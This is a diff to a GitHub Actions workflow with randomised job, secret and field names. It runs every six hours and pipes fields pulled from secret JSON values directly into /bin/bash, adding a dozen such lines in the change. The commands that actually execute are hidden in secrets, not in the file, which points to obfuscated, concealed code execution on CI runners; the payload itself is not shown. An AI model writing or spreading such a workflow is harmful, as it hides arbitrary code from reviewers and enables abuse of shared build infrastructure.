@@ -1,10 +1,10 @@
 name: fuguntang6734
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 4/6 * * *'
-
-jobs:  # 20
+    - cron: '24 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,10 +12,18 @@ jobs:  # 20
       - uses: actions/checkout@v4
       - name: fuguntang6734
         env:
-          i583: ${{ secrets.i583 }}
+          geq84723: ${{ secrets.geq84723 }}
         run: |
-          echo $i583 | jq -r .r1571 | /bin/bash
-          echo $dbxv4847 | jq -r .feoub2637 | /bin/bash
-          echo $rhl476 | jq -r .rs61 | /bin/bash
-          echo $ktio4 | jq -r .hel08228 | /bin/bash
+          echo $geq84723 | jq -r .kl0252 | /bin/bash
+          echo $ryy9294 | jq -r .cgpdr8219 | /bin/bash
+          echo $eqqi1810 | jq -r .nob3714 | /bin/bash
+          echo $t943 | jq -r .aggvs6 | /bin/bash
+          echo $vugx2674 | jq -r .czlga5 | /bin/bash
+          echo $yxxwu0483 | jq -r .fek416 | /bin/bash
+          echo $q6346 | jq -r .sg5 | /bin/bash
+          echo $pcy876 | jq -r .j4 | /bin/bash
+          echo $esggy1773 | jq -r .uj87 | /bin/bash
+          echo $bqxm46423 | jq -r .w4 | /bin/bash
+          echo $sreco24377 | jq -r .zj31083 | /bin/bash
+          echo $eka73636 | jq -r .vsar40 | /bin/bash
 
